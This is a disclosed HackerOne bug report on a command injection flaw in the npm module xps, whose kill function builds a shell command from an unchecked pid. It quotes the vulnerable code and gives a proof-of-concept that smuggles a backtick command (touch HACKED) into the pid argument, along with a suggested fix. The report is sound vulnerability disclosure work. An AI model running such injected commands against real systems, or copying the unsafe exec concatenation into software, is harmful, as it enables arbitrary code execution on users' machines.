---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '865168'
original_report_id: '865168'
title: '[xps] Command Injection via insecure command concatenation'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2020-05-03T10:10:58.198Z'
disclosed_at: '2020-07-23T19:51:49.316Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [xps] Command Injection via insecure command concatenation

## Metadata

- HackerOne Report ID: 865168
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2020-07-23T19:51:49.316Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `Command Injection` issue in the `xps` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `xps`
**version:** `1.0.2`
**npm page:** `https://www.npmjs.com/package/xps`

## Module Description

xps is a cross-platform library for listing and killing processes.

## Module Stats

[10] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/robotlolita/xps/blob/master/lib/linux.js#L48
...
var shell = require('./utils').shell;
... 
exports.kill = kill;
function kill(pid) {
  return shell('kill', ['-9', pid]).map(K(undefined));  // <-- user's input
}

// --------------------------------------------------
// https://github.com/robotlolita/xps/blob/master/lib/utils.js#L26
...
var exec    = require('child_process').exec;
...
var escapeArg = JSON.stringify;
...
exports.shell = shell;
function shell(cmd, args) {
  var command = cmd + ' ' + args.map(unary(compose(escapeArg)(String))).join(' '); // <-- injection
  return new Task(function(reject, resolve) {
    exec(command, function(error, stdout, stderr) {
      if (error)  reject(error);
      else        resolve({ output: stdout, error: stderr });
    });
  });
}
```
The argument `pid` is used to build the command that is passed to the `child_process.exec` function without any sanitization.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `xps` module:
    -  `npm i xps`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const ps = require('xps');
ps.kill('`touch HACKED;`').fork();
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F813050}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.
In this case it could be helpful to parse the pid as integer (`var pid = parseInt(pid)`).

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on a `xps` module via insecure command concatenation.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
